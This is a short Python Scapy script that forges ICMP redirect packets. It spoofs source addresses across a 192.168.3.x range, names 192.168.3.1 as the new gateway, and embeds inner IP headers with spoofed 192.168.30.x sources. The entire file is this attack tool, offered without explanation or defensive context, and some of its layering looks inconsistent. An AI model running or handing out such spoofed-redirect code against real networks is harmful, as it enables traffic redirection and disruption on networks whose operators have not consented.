#coding:utf-8
from scapy.all import *

for i in range(2,255):
	frame = Ether(dst = "ff:ff:ff:ff:ff:ff")
	ip = IP()
	ip.src = "192.168.3." + str(i)
	ip.dst = "8.8.8.8"
	icmp=ICMP()
	icmp.type=5
	icmp.code=1
	icmp.gw = "192.168.3.1"
	ip2 = IP()
	ip2.src = "192.168.30." + str(i)
	ip2.dst = "142.251.37.35"
	print(ip.src)
#	print(ip2.src,"\n\n")
	send(frame/ip/icmp/ip2/UDP())
